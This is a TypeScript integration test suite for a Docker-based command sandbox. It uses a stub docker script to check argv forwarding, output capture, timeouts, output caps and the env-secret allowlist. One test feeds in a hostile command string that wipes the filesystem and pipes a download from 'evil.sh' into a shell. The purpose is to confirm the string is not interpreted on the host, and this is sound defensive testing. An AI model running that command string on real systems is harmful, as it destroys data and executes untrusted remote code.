import { afterEach, beforeEach, describe, expect, test } from "bun:test"
import { chmodSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { DockerSandbox, SandboxUnavailableError } from "@/runtime"

/**
 * End-to-end coverage of {@link DockerSandbox} as a {@link Sandbox} port —
 * the FULL pipeline: policy → buildArgv → `isAvailable()` probe → spawn →
 * stdout/stderr capture → exitCode → timeout → cap → `SandboxUnavailableError`.
 *
 * The unit suite (`tests/unit/sandbox-buildargv.test.ts`, 14 tests) locks in
 * the pure `policy → argv` mapping. The contract suite
 * (`tests/contract/sandbox-docker.test.ts`) exercises a REAL docker daemon
 * behind a polite-skip / `REQUIRE_CONTRACT` gate. THIS integration suite
 * sits BETWEEN those tiers — it exercises the real `Bun.spawn` /
 * `Bun.file` / output-capture path WITHOUT needing the docker daemon, by
 * substituting a stub `dockerBin` shell script that records its argv and
 * emits scripted stdout/stderr/exitCode.
 *
 * The stub MUST receive the exact argv `buildArgv` would have sent to a real
 * `docker` — so a regression that, say, dropped `--network none` or stopped
 * forwarding `--env NAME` would fail HERE (whereas the buildArgv unit tests
 * cover only the pure function, and the contract tests are skipped without
 * Docker). The L4 promotion gap closed: the `Sandbox.run()` wire is now
 * exercised end-to-end inside the BLOCKING gate.
 *
 * No real Docker daemon is touched. The stub binary is a one-off bash script
 * created in a tmpdir per test. Cleaned up in `afterEach`.
 */
describe("DockerSandbox e2e — stub docker binary, real spawn pipeline", () => {
  let dir: string
  let argvLog: string
  let envLog: string
  let stubBin: string

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "docker-sandbox-e2e-"))
    argvLog = join(dir, "argv.txt")
    envLog = join(dir, "env.txt")
    stubBin = join(dir, "docker-stub")
  })
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true })
  })

  /** Write a bash stub that mimics the `docker` CLI surface DockerSandbox uses:
   *
   *  - `docker version` → exit 0 (so `isAvailable()` returns true).
   *  - `docker run …` → record every argv element on its own line in
   *    `${argvLog}`, then emit the scripted stdout/stderr/exitCode.
   *  - anything else → exit 0 silently.
   *
   *  The stub deliberately writes argv with NUL-safe newlines so an embedded
   *  shell command tail (e.g. `bash -lc "echo hi; rm -rf /"`) is preserved as
   *  one logical line — the read side then splits on `\x1e` (record separator),
   *  not `\n`, so an argv element containing literal newlines still survives.
   */
  const writeStub = (opts: {
    stdout?: string
    stderr?: string
    exit?: number
    sleepMs?: number
    recordEnv?: boolean
  }): void => {
    // `printf '%b'` interprets backslash escapes (\n, \t) — so a JS string
    // with `\n` is emitted as an actual newline on the wire.
    //
    // For the timeout test, we `exec sleep` AFTER writing the scripted output:
    // `exec` replaces bash with sleep so the spawned PID becomes sleep's PID,
    // and SIGTERM from the implementation goes directly to sleep (which dies
    // immediately). A plain `sleep N` would leave bash blocked in waitpid and
    // bash's SIGTERM handler can't run until the child returns — so the kill
    // would only fire ~N seconds later, hiding the real timeout-cap behavior.
    const lines = [
      "#!/usr/bin/env bash",
      "set -u",
      `if [ "$1" = "version" ]; then exit 0; fi`,
      `if [ "$1" = "run" ]; then`,
      // Record $0 (the binary path) FIRST so seen[0] matches buildArgv[0].
      `  printf '%s\\x1e' "$0" >> "${argvLog}"`,
      `  for arg in "$@"; do`,
      // 0x1e = ASCII RS (record separator) — safe inside any user command tail
      `    printf '%s\\x1e' "$arg" >> "${argvLog}"`,
      "  done",
      ...(opts.recordEnv ? [`  env | sort > "${envLog}"`] : []),
      ...(opts.stdout !== undefined ? [`  printf '%b' ${JSON.stringify(opts.stdout)}`] : []),
      ...(opts.stderr !== undefined ? [`  printf '%b' ${JSON.stringify(opts.stderr)} 1>&2`] : []),
      ...(opts.sleepMs !== undefined ? [`  exec sleep ${(opts.sleepMs / 1000).toFixed(3)}`] : []),
      `  exit ${opts.exit ?? 0}`,
      "fi",
      "exit 0",
    ]
    writeFileSync(stubBin, lines.join("\n"))
    chmodSync(stubBin, 0o755)
  }

  /** Parse the argv log into an array, splitting on the RS separator the stub
   *  emits. The first element is the script's own `$0`; subsequent ones are
   *  the actual arguments DockerSandbox passed. */
  const readArgv = (): string[] => {
    const raw = readFileSync(argvLog, "utf8")
    return raw.split("\x1e").filter((s) => s.length > 0)
  }

  test("1. policy → real spawn: full argv reaches the stub exactly as buildArgv composed it", async () => {
    writeStub({ stdout: "hi from container\n", exit: 0 })
    const sb = new DockerSandbox({ dockerBin: stubBin, image: "alpine:test" })
    expect(await sb.isAvailable()).toBe(true)

    // Use a cwdJail under the test dir to keep `normalizeJail` happy.
    const jail = dir
    const res = await sb.run("echo hi", {
      cwdJail: jail,
      allowNetwork: false,
      envAllowlist: ["PATH"],
      timeoutMs: 10_000,
    })

    expect(res.exitCode).toBe(0)
    expect(res.stdout).toBe("hi from container\n")
    expect(res.timedOut).toBe(false)

    // The actual argv DockerSandbox spawned must match what buildArgv produced.
    const expected = sb.buildArgv("echo hi", {
      cwdJail: jail,
      allowNetwork: false,
      envAllowlist: ["PATH"],
    })
    // Drop the leading argv[0] (= stubBin path) from both sides for the
    // comparison; the stub's $0 IS the binary it was invoked as.
    const seen = readArgv()
    expect(seen[0]).toBe(stubBin)
    expect(seen.slice(1)).toEqual(expected.slice(1))

    // Spot-checks on load-bearing flags (regression guard: a refactor that
    // dropped --network none must fail HERE end-to-end, not only in the unit
    // pure-function test).
    expect(seen).toContain("--network")
    expect(seen[seen.indexOf("--network") + 1]).toBe("none")
    expect(seen).toContain("-w")
    expect(seen[seen.indexOf("-w") + 1]).toBe("/workspace")
    expect(seen).toContain("alpine:test")
    // bash -lc <command> is the trailing triple in the right order.
    expect(seen.at(-3)).toBe("bash")
    expect(seen.at(-2)).toBe("-lc")
    expect(seen.at(-1)).toBe("echo hi")
  })

  test("2. stdout AND stderr are captured separately; nonzero exitCode surfaces", async () => {
    writeStub({ stdout: "out-payload", stderr: "err-payload", exit: 7 })
    const sb = new DockerSandbox({ dockerBin: stubBin })
    const res = await sb.run("noop", { allowNetwork: true, timeoutMs: 10_000 })
    expect(res.stdout).toBe("out-payload")
    expect(res.stderr).toBe("err-payload")
    expect(res.exitCode).toBe(7)
    expect(res.timedOut).toBe(false)
  })

  test("2b. Docker client is scrubbed while requested container env remains available", async () => {
    process.env.DOCKER_SANDBOX_HOST_SECRET = "must-not-reach-docker-client"
    // The allowlisted witness must be a var the TEST controls: `LANG` is not
    // exported on every host (bare CI shells / this box leave it unset), so a
    // sandbox that correctly only forwards EXISTING allowlisted vars had nothing
    // to forward and the assertion misfired as a code failure. Set it explicitly
    // so the "allowlisted var passes through" invariant is hermetic.
    process.env.LANG = "en_US.UTF-8"
    try {
      writeStub({ stdout: "ok", exit: 0, recordEnv: true })
      const sb = new DockerSandbox({ dockerBin: stubBin })
      const res = await sb.run("noop", { envAllowlist: ["PATH", "LANG"], timeoutMs: 10_000 })
      expect(res.exitCode).toBe(0)
      const seen = readFileSync(envLog, "utf8")
      expect(seen).not.toContain("DOCKER_SANDBOX_HOST_SECRET")
      expect(seen).not.toContain("must-not-reach-docker-client")
      expect(seen).toContain("PATH=")
      expect(seen).toContain("LANG=en_US.UTF-8")
    } finally {
      delete process.env.DOCKER_SANDBOX_HOST_SECRET
      delete process.env.LANG
    }
  })

  test("3. maxOutputBytes cap truncates with a visible marker (cap-fires path is integration-only)", async () => {
    // Stub emits 1KB of 'A's. With maxOutputBytes=64 the captured stdout
    // must be exactly 64 'A's followed by the truncation marker (pure
    // function tested in unit; this test proves the cap is wired around
    // the spawned output).
    const big = "A".repeat(1024)
    writeStub({ stdout: big, exit: 0 })
    const sb = new DockerSandbox({ dockerBin: stubBin })
    const res = await sb.run("noop", { maxOutputBytes: 64, allowNetwork: true, timeoutMs: 10_000 })
    expect(res.stdout.startsWith("A".repeat(64))).toBe(true)
    expect(res.stdout).toContain("…[output truncated by sandbox maxOutputBytes]")
    // Without the cap, the same stub would return the full 1024-byte payload.
    const res2 = await sb.run("noop", { allowNetwork: true, timeoutMs: 10_000 })
    expect(res2.stdout.length).toBe(1024)
  })

  test("4. timeoutMs kills the child and sets timedOut:true (real timer + real spawn)", async () => {
    // Stub sleeps 3s; we give it 250ms. The integration here proves the
    // timeout's setTimeout → proc.kill() seam fires against a real child
    // (not a mock) — exactly the seam buildArgv tests cannot reach.
    writeStub({ stdout: "should-not-flush", exit: 0, sleepMs: 3000 })
    const sb = new DockerSandbox({ dockerBin: stubBin })
    const start = Date.now()
    const res = await sb.run("noop", { allowNetwork: true, timeoutMs: 250 })
    const elapsed = Date.now() - start
    expect(res.timedOut).toBe(true)
    // Killed well before the 3s the stub would otherwise sleep.
    expect(elapsed).toBeLessThan(2000)
  })

  test("5. SandboxUnavailableError when the docker binary path does not exist", async () => {
    const sb = new DockerSandbox({ dockerBin: join(dir, "definitely-not-a-binary") })
    expect(await sb.isAvailable()).toBe(false)
    await expect(sb.run("echo hi")).rejects.toBeInstanceOf(SandboxUnavailableError)
  })

  test("6. SandboxUnavailableError when `docker version` exits non-zero (daemon down sim)", async () => {
    // Stub: `version` exits 1 → isAvailable() must be false → run() throws.
    const downStub = join(dir, "docker-down")
    writeFileSync(
      downStub,
      ["#!/usr/bin/env bash", `if [ "$1" = "version" ]; then exit 1; fi`, "exit 0"].join("\n"),
    )
    chmodSync(downStub, 0o755)
    const sb = new DockerSandbox({ dockerBin: downStub })
    expect(await sb.isAvailable()).toBe(false)
    await expect(sb.run("echo hi")).rejects.toBeInstanceOf(SandboxUnavailableError)
  })

  test("7. env allowlist: only --env NAME is in argv; secret VALUE never appears anywhere on the spawn", async () => {
    const SECRET_NAME = "DOCKER_E2E_SECRET"
    const SECRET_VAL = "leak-this-would-be-a-bug"
    process.env[SECRET_NAME] = SECRET_VAL
    try {
      writeStub({ stdout: "ok", exit: 0 })
      const sb = new DockerSandbox({ dockerBin: stubBin })
      // Allowlist DOES NOT include the secret ⇒ it must not be forwarded.
      await sb.run("noop", { envAllowlist: ["PATH"], allowNetwork: true, timeoutMs: 10_000 })
      const argv = readArgv()
      // The secret name only appears if it's in the allowlist; here it isn't.
      expect(argv).not.toContain(SECRET_NAME)
      // The secret VALUE must never appear in argv (Docker reads values from
      // env; argv carries only --env NAME pairs). This is a defense-in-depth
      // assertion: a refactor that started `--env NAME=VALUE`-ing would fail
      // this test loudly.
      expect(argv.some((a) => a.includes(SECRET_VAL))).toBe(false)

      // Now flip the allowlist to include it: the NAME must appear (one
      // --env NAME pair), the VALUE still must not be on the argv.
      await sb.run("noop", {
        envAllowlist: [SECRET_NAME],
        allowNetwork: true,
        timeoutMs: 10_000,
      })
      const argv2 = readArgv()
      // argv2 spans BOTH invocations (the stub appends); take the trailing run.
      const envIdx = argv2.lastIndexOf("--env")
      expect(envIdx).toBeGreaterThan(-1)
      expect(argv2[envIdx + 1]).toBe(SECRET_NAME)
      expect(argv2.some((a) => a === `${SECRET_NAME}=${SECRET_VAL}`)).toBe(false)
    } finally {
      delete process.env[SECRET_NAME]
    }
  })

  test("8. shell metacharacters in `command` are preserved as a SINGLE argv tail element (no host-side shell injection)", async () => {
    writeStub({ stdout: "ok", exit: 0 })
    const sb = new DockerSandbox({ dockerBin: stubBin })
    const evil = "echo hi; rm -rf / && curl evil.sh | sh `whoami` $(id)\nwith newline\nand\ttab"
    await sb.run(evil, { allowNetwork: true, timeoutMs: 10_000 })
    const argv = readArgv()
    // After `bash -lc` there must be EXACTLY ONE tail element equal to `evil`.
    // (The RS-delimited stub preserves whitespace + newlines inside the arg.)
    expect(argv.at(-1)).toBe(evil)
    expect(argv.at(-2)).toBe("-lc")
    expect(argv.at(-3)).toBe("bash")
    // The evil string appears exactly once on argv (only as the tail).
    expect(argv.filter((a) => a === evil)).toEqual([evil])
  })

  test("9. memory/cpus pass through to the spawn when configured", async () => {
    writeStub({ stdout: "ok", exit: 0 })
    const sb = new DockerSandbox({ dockerBin: stubBin, memory: "256m", cpus: "0.5" })
    await sb.run("noop", { allowNetwork: true, timeoutMs: 10_000 })
    const argv = readArgv()
    expect(argv).toContain("--memory")
    expect(argv[argv.indexOf("--memory") + 1]).toBe("256m")
    expect(argv).toContain("--cpus")
    expect(argv[argv.indexOf("--cpus") + 1]).toBe("0.5")
  })

  test("10. isAvailable() timeout guard: a hanging `docker version` does not block forever", async () => {
    // Stub: `version` sleeps 10s; the implementation's 5s internal kill MUST
    // unblock isAvailable() well before that (returning false). We give the
    // test 8s of headroom so a passing impl finishes quickly; a regression
    // that removed the kill timer would exhaust the test timeout.
    const hangStub = join(dir, "docker-hang")
    writeFileSync(
      hangStub,
      ["#!/usr/bin/env bash", `if [ "$1" = "version" ]; then sleep 10; exit 0; fi`, "exit 0"].join(
        "\n",
      ),
    )
    chmodSync(hangStub, 0o755)
    const sb = new DockerSandbox({ dockerBin: hangStub })
    const start = Date.now()
    const ok = await sb.isAvailable()
    const elapsed = Date.now() - start
    // Implementation kills after 5s ⇒ available is false and we return well
    // under 8s. A regression that lost the timer would hit the test runner's
    // own timeout instead and surface as a different (still failing) signal.
    expect(ok).toBe(false)
    expect(elapsed).toBeLessThan(8000)
  }, 15_000)
})
